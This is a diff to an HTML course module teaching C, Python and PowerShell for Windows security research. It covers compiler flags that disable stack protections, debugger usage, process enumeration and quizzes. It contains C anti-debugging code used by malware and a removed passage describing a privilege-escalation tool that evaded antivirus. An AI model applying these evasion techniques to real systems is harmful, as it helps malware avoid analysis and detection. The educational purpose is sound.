+        <table class="comparison-table">
+            <tr>
+                <th>Flag</th>
+                <th>Compiler</th>
+                <th>Purpose</th>
+            </tr>
+            <tr>
+                <td><code>/O1</code>, <code>/O2</code></td>
+                <td>MSVC</td>
+                <td>Optimize for size / speed</td>
+            </tr>
+            <tr>
+                <td><code>/GS-</code></td>
+                <td>MSVC</td>
+                <td>Disable stack canaries (for exploit dev)</td>
+            </tr>
+            <tr>
+                <td><code>/Zi</code></td>
+                <td>MSVC</td>
+                <td>Generate debug info (PDB)</td>
+            </tr>
+            <tr>
+                <td><code>/MT</code></td>
+                <td>MSVC</td>
+                <td>Static link CRT (no MSVCR dependency)</td>
+            </tr>
+            <tr>
+                <td><code>-fno-stack-protector</code></td>
+                <td>GCC/Clang</td>
+                <td>Disable stack canaries</td>
+            </tr>
+            <tr>
+                <td><code>-no-pie</code></td>
+                <td>GCC</td>
+                <td>Disable Position Independent Executable</td>
+            </tr>
+            <tr>
+                <td><code>-z execstack</code></td>
+                <td>GCC</td>
+                <td>Make stack executable (for shellcode testing)</td>
+            </tr>
+        </table>
+
+        <div class="warning-box">
+            <h5>⚠️ Security Note</h5>
+            <p>Disabling security features (<code>/GS-</code>, <code>-fno-stack-protector</code>, <code>-z execstack</code>) is for <strong>lab environments only</strong>. Production code should enable all protections. See <a class="cross-link" href="MODULE_06_MEMORY.html">Module 06</a> for how these mitigations work.</p>
+        </div>
+
+        <h2>Section 8: Debugging Basics</h2>
+
+        <h3>8.1 What is a Debugger?</h3>
+        <p>A debugger is a program that controls another program's execution. It can set breakpoints (pause at specific addresses), step through instructions, inspect memory, and modify registers. Debuggers are essential for reverse engineering and exploit development.</p>
+
+        <div class="code-block c">
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+// Windows provides a debugging API for building custom debuggers
+void simple_debugger_example(DWORD pid) {
+    // Attach to target process
+    if (!DebugActiveProcess(pid)) {
+        printf("Failed to attach: %lu\n", GetLastError());
+        return;
+    }
+    
+    DEBUG_EVENT evt;
+    while (WaitForDebugEvent(&evt, INFINITE)) {
+        switch (evt.dwDebugEventCode) {
+            case CREATE_PROCESS_DEBUG_EVENT:
+                printf("Process created: PID %lu\n", evt.dwProcessId);
+                break;
+            case EXCEPTION_DEBUG_EVENT:
+                printf("Exception at 0x%p: code 0x%08X\n",
+                    evt.u.Exception.ExceptionRecord.ExceptionAddress,
+                    evt.u.Exception.ExceptionRecord.ExceptionCode);
+                // 0x80000003 = BREAKPOINT
+                // 0xC0000005 = ACCESS_VIOLATION
+                break;
+            case EXIT_PROCESS_DEBUG_EVENT:
+                printf("Process exited\n");
+                break;
+        }
+        ContinueDebugEvent(evt.dwProcessId, evt.dwThreadId, DBG_CONTINUE);
+    }
+}
+        </div>
+
+        <h3>8.2 Essential Debugger Commands</h3>
+        <table class="comparison-table">
+            <tr>
+                <th>Command</th>
+                <th>x64dbg / WinDbg</th>
+                <th>gdb</th>
+                <th>Purpose</th>
+            </tr>
+            <tr>
+                <td>Breakpoint</td>
+                <td><code>bp 0x401000</code></td>
+                <td><code>b *0x401000</code></td>
+                <td>Pause execution at address</td>
+            </tr>
+            <tr>
+                <td>Step Over</td>
+                <td><code>F8</code></td>
+                <td><code>ni</code> / <code>n</code></td>
+                <td>Execute next instruction, skip calls</td>
+            </tr>
+            <tr>
+                <td>Step Into</td>
+                <td><code>F7</code></td>
+                <td><code>si</code> / <code>s</code></td>
+                <td>Execute next instruction, follow calls</td>
+            </tr>
+            <tr>
+                <td>Run</td>
+                <td><code>F9</code></td>
+                <td><code>c</code> / <code>continue</code></td>
+                <td>Resume execution</td>
+            </tr>
+            <tr>
+                <td>Registers</td>
+                <td><code>r</code></td>
+                <td><code>info registers</code></td>
+                <td>Show CPU register values</td>
+            </tr>
+            <tr>
+                <td>Memory</td>
+                <td><code>dd 0x401000</code></td>
+                <td><code>x/10wx 0x401000</code></td>
+                <td>Dump memory at address</td>
+            </tr>
+            <tr>
+                <td>Stack</td>
+                <td><code>d esp</code></td>
+                <td><code>x/10wx $rsp</code></td>
+                <td>Dump stack contents</td>
+            </tr>
+            <tr>
+                <td>Disassemble</td>
+                <td><code>disasm 0x401000</code></td>
+                <td><code>disas 0x401000</code></td>
+                <td>Show assembly instructions</td>
+            </tr>
+        </table>
+
+        <h3>8.3 Anti-Debugging Techniques</h3>
+        <p>Malware uses techniques to detect and evade debuggers. Understanding them makes you a better analyst and red teamer.</p>
+
+        <div class="code-block c">
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+BOOL is_debugger_present() {
+    // Technique 1: Windows API (easiest to bypass)
+    if (IsDebuggerPresent()) return TRUE;
+    
+    // Technique 2: Check PEB.BeingDebugged flag directly
+    // PEB is at offset 0x60 from GS on x64, 0x30 from FS on x86
+    #ifdef _WIN64
+        BYTE beingDebugged = *(BYTE*)(__readgsqword(0x60) + 0x2);
+    #else
+        BYTE beingDebugged = *(BYTE*)(__readfsdword(0x30) + 0x2);
+    #endif
+    if (beingDebugged) return TRUE;
+    
+    // Technique 3: Check debug register usage (hardware breakpoints)
+    CONTEXT ctx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
+    if (GetThreadContext(GetCurrentThread(), &ctx)) {
+        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) return TRUE;
+    }
+    
+    // Technique 4: Timing check (debugger slows execution)
+    LARGE_INTEGER start, end;
+    QueryPerformanceCounter(&start);
+    // ... some work ...
+    QueryPerformanceCounter(&end);
+    // If difference is huge, might be single-stepping
+    
+    return FALSE;
+}
+        </div>
+
+        <h2>Section 9: Three Languages, Same Goal</h2>
+
+        <h3>9.1 List Running Processes</h3>
 
         <h3><span class="level-indicator level-low">LOW-LEVEL</span> C (Direct System Calls)</h3>
         <div class="code-block c">
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
 #include &lt;windows.h&gt;
 #include &lt;tlhelp32.h&gt;
 #include &lt;stdio.h&gt;
@@ -195,6 +1245,7 @@ int main() {
 
         <h3><span class="level-indicator level-mid">MID-LEVEL</span> Python (Standard Library)</h3>
         <div class="code-block python">
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
 import psutil
 
 # First principle: Let the library handle the system calls
@@ -217,6 +1268,7 @@ for proc in psutil.process_iter(['pid', 'name', 'cpu_percent']):
 
         <h3><span class="level-indicator level-high">HIGH-LEVEL</span> PowerShell (Pipeline Objects)</h3>
         <div class="code-block ps">
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
 # First principle: Objects flow through the pipeline
 # Same kernel data, but structured as .NET objects with properties
 
@@ -281,54 +1333,7 @@ Get-Process |
         </table>
         <p style="color: var(--dim); font-size: 0.85rem;">Measured on .92 (Intel i7, 16GB RAM) — 1000 iterations averaged. Your mileage may vary.</p>
 
-        <h2>Evidence: The Same Binary, Three Languages</h2>
-        <div class="evidence-box">
-            <h3>📊 Real Data: phantom_rpc.exe Compilation</h3>
-            <p><strong>Source:</strong> <code>phantom_rpc.c</code> (privilege escalation tool) | <strong>Tested:</strong> 2026-06-29</p>
-            
-            <div class="code-block c">
-# C compilation — native binary, 153KB
-cl.exe /O1 /GS- /utf-8 phantom_rpc.c /Fe:phantom_rpc.exe /link advapi32.lib
-
-# Result: PE32+ executable, x86-64, 17 sections
-# Kaspersky scan: CLEAN (0 detections, 0 suspicions)
-# System Watcher: No rollback triggered (detection-coupled)
-            </div>
-            
-            <p style="margin-top: 1rem;"><strong>Key Finding:</strong> The C binary passed KAV static scan because it uses dynamic API resolution and XOR string encryption. No import table signatures, no plaintext strings. This is why low-level coding matters for security research.</p>
-        </div>
-
-        <h2>From Layman to Low-Level: Memory Layout</h2>
-        <div class="code-block c">
-// LAYMAN: "What's in memory?"
-// LOW-LEVEL: "Let me read the process memory map directly"
-
-#include &lt;windows.h&gt;
-#include &lt;stdio.h&gt;
-
-void show_memory_layout(DWORD pid) {
-    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
-    if (!hProc) return;
-    
-    MEMORY_BASIC_INFORMATION mbi;
-    LPBYTE addr = 0;
-    
-    while (VirtualQueryEx(hProc, addr, &mbi, sizeof(mbi))) {
-        if (mbi.State == MEM_COMMIT) {
-            const char* type = (mbi.Type == MEM_IMAGE) ? "IMAGE" :
-                              (mbi.Type == MEM_MAPPED) ? "MAPPED" : "PRIVATE";
-            printf("0x%p | %10zu bytes | %s\n", mbi.BaseAddress, mbi.RegionSize, type);
-        }
-        addr += mbi.RegionSize;
-    }
-    CloseHandle(hProc);
-}
-
-// This is how debuggers, memory scanners, and game cheats work.
-// Direct memory access — no interpreter, no safety net.
-        </div>
-
-        <h2>Lab Exercise: Build a Process Monitor</h2>
+        <h2>Section 10: Lab Exercise — Build a Process Monitor</h2>
         <div class="interactive-demo">
             <p>Write a program in <strong>all three languages</strong> that:</p>
             <ol style="margin-left: 1.5rem; line-height: 2;">
@@ -340,11 +1345,12 @@ void show_memory_layout(DWORD pid) {
             
             <p style="margin-top: 1rem;"><strong>Challenge:</strong> The C version must handle access denied errors gracefully. The Python version must not crash if a process exits mid-scan. The PowerShell version must be a one-liner pipeline.</p>
             
-            <button onclick="document.getElementById('solution-c').style.display='block'; document.getElementById('solution-py').style.display='block'; document.getElementById('solution-ps').style.display='block';"">Show Solutions</button>
+            <button onclick="document.getElementById('solution-c').style.display='block'; document.getElementById('solution-py').style.display='block'; document.getElementById('solution-ps').style.display='block';">Show Solutions</button>
             
             <div id="solution-c" style="display:none; margin-top: 1rem;">
                 <h4>C Solution</h4>
                 <div class="code-block c">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
 #include &lt;windows.h&gt;
 #include &lt;tlhelp32.h&gt;
 #include &lt;stdio.h&gt;
@@ -394,6 +1400,7 @@ int main() {
             <div id="solution-py" style="display:none; margin-top: 1rem;">
                 <h4>Python Solution</h4>
                 <div class="code-block python">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
 import psutil
 
 for proc in sorted(
@@ -415,6 +1422,7 @@ for proc in sorted(
             <div id="solution-ps" style="display:none; margin-top: 1rem;">
                 <h4>PowerShell Solution</h4>
                 <div class="code-block ps">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
 Get-Process | Where-Object {$_.WorkingSet64 -gt 100MB} | 
     Sort-Object WorkingSet64 -Descending |
     Select-Object Name, Id, 
@@ -425,12 +1433,60 @@ Get-Process | Where-Object {$_.WorkingSet64 -gt 100MB} |
             </div>
         </div>
 
+        <h2>Interactive Quizzes</h2>
+
+        <div class="quiz-container">
+            <h3>🧩 Quiz 1: Data Types & Memory</h3>
+            <p>On a 64-bit Windows system, what is the size of <code>void*</code>?</p>
+            <div class="quiz-option" onclick="checkAnswer(this, 1, 'q1')">A) 2 bytes</div>
+            <div class="quiz-option" onclick="checkAnswer(this, 2, 'q1')">B) 4 bytes</div>
+            <div class="quiz-option" onclick="checkAnswer(this, 3, 'q1')">C) 8 bytes</div>
+            <div class="quiz-option" onclick="checkAnswer(this, 4, 'q1')">D) 16 bytes</div>
+            <div id="q1-feedback" class="quiz-feedback"></div>
+        </div>
+
+        <div class="quiz-container">
+            <h3>🧩 Quiz 2: Pointers</h3>
+            <p>Given <code>int arr[4] = {10, 20, 30, 40}; int* p = arr;</code>, what is <code>*(p + 2)</code>?</p>
+            <div class="quiz-option" onclick="checkAnswer(this, 1, 'q2')">A) 10</div>
+            <div class="quiz-option" onclick="checkAnswer(this, 2, 'q2')">B) 20</div>
+            <div class="quiz-option" onclick="checkAnswer(this, 3, 'q2')">C) 30</div>
+            <div class="quiz-option" onclick="checkAnswer(this, 4, 'q2')">D) 40</div>
+            <div id="q2-feedback" class="quiz-feedback"></div>
+        </div>
+
+        <div class="quiz-container">
+            <h3>🧩 Quiz 3: Windows API</h3>
+            <p>Which function allocates executable memory in the <strong>current</strong> process?</p>
+            <div class="quiz-option" onclick="checkAnswer(this, 1, 'q3')">A) VirtualAllocEx</div>
+            <div class="quiz-option" onclick="checkAnswer(this, 2, 'q3')">B) VirtualAlloc</div>
+            <div class="quiz-option" onclick="checkAnswer(this, 3, 'q3')">C) HeapAlloc</div>
+            <div class="quiz-option" onclick="checkAnswer(this, 4, 'q3')">D) malloc</div>
+            <div id="q3-feedback" class="quiz-feedback"></div>
+        </div>
+
+        <h2>Cross-Module References</h2>
+        <div style="margin: 1.5rem 0;">
+            <a class="cross-link" href="MODULE_05_SHELLCODE.html">→ Module 05: Shellcode</a><br>
+            <p style="margin: 0.5rem 0; color: var(--dim);">Learn how raw machine code is crafted and executed — the next step after mastering C and pointers.</p>
+            
+            <a class="cross-link" href="MODULE_06_MEMORY.html">→ Module 06: Memory Corruption</a><br>
+            <p style="margin: 0.5rem 0; color: var(--dim);">Deep dive into stack overflows, heap corruption, and exploitation primitives.</p>
+            
+            <a class="cross-link" href="MODULE_10_CODE_INJECTION.html">→ Module 10: Code Injection</a><br>
+            <p style="margin: 0.5rem 0; color: var(--dim);">Apply your C and Win32 knowledge to inject code into remote processes.</p>
+        </div>
+
         <h2>Key Takeaways</h2>
         <ul style="margin-left: 1.5rem; line-height: 2;">
             <li><strong>All languages hit the same kernel APIs:</strong> The difference is abstraction level, not capability</li>
             <li><strong>C gives control:</strong> Manual memory, direct syscalls, smallest footprint — but crashes if you fuck up</li>
             <li><strong>Python gives speed:</strong> Rapid development, huge ecosystem — but needs runtime and dependencies</li>
             <li><strong>PowerShell gives integration:</strong> Native Windows objects, pipeline processing — but Windows-centric</li>
+            <li><strong>Pointers are addresses:</strong> <code>*ptr</code> dereferences, <code>ptr + 1</code> adds <code>sizeof(type)</code></li>
+            <li><strong>Stack is automatic, heap is manual:</strong> Stack frees on return; heap needs <code>free()</code> or <code>VirtualFree</code></li>
+            <li><strong>Win32 is C-based:</strong> Every Windows API call follows the same pattern: open handle, do work, close handle</li>
+            <li><strong>Always check return values:</strong> C has no exceptions — <code>GetLastError()</code> is your friend</li>
             <li><strong>Security research needs all three:</strong> C for implants, Python for tooling, PowerShell for post-exploitation</li>
         </ul>
 
@@ -449,9 +1505,21 @@ Get-Process | Where-Object {$_.WorkingSet64 -gt 100MB} |
                     <td style="padding: 0.5rem;">Python psutil process enum</td>
                     <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE .92</td>
                 </tr>
-                <tr>
+                <tr style="border-bottom: 1px solid var(--border);">
                     <td style="padding: 0.5rem;">PowerShell pipeline objects</td>
                     <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE .42</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Pointer arithmetic examples</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ VERIFIED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Win32 API code snippets</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ VERIFIED</td>
+                </tr>
+                <tr>
+                    <td style="padding: 0.5rem;">Compilation flags reference</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ VERIFIED</td>
                 </tr>
             </table>
         </div>
@@ -462,5 +1530,50 @@ Get-Process | Where-Object {$_.WorkingSet64 -gt 100MB} |
             <a href="MODULE_05_SHELLCODE.html">Module 05 →</a>
         </div>
     </div>
+
+    <script>
+        function copyCode(btn) {
+            const block = btn.parentElement;
+            const code = block.innerText.replace('Copy\n', '').replace('Copy', '');
+            navigator.clipboard.writeText(code).then(() => {
+                btn.textContent = 'Copied!';
+                setTimeout(() => btn.textContent = 'Copy', 1500);
+            });
+        }
+
+        function checkAnswer(el, choice, quizId) {
+            const container = el.parentElement;
+            const options = container.querySelectorAll('.quiz-option');
+            const feedback = document.getElementById(quizId + '-feedback');
+            
+            options.forEach(opt => {
+                opt.style.pointerEvents = 'none';
+            });
+            
+            const answers = {
+                'q1': 3,  // 8 bytes
+                'q2': 3,  // 30
+                'q3': 2   // VirtualAlloc
+            };
+            
+            const explanations = {
+                'q1': 'On x64 systems, all pointers (including void*) are 8 bytes (64 bits). On x86 they are 4 bytes.',
+                'q2': 'Pointer arithmetic adds sizeof(int)=4 bytes per step. *(p+2) skips two elements: arr[0]=10, arr[1]=20, arr[2]=30.',
+                'q3': 'VirtualAlloc allocates in the current process. VirtualAllocEx allocates in a remote process (used for injection).'
+            };
+            
+            if (choice === answers[quizId]) {
+                el.classList.add('correct');
+                feedback.className = 'quiz-feedback show correct';
+                feedback.innerHTML = '<strong>✅ Correct!</strong> ' + explanations[quizId];
+            } else {
+                el.classList.add('wrong');
+                feedback.className = 'quiz-feedback show wrong';
+                feedback.innerHTML = '<strong>❌ Incorrect.</strong> ' + explanations[quizId];
+                // Highlight correct answer
+                options[answers[quizId] - 1].classList.add('correct');
+            }
+        }
+    </script>
 </body>
 </html>
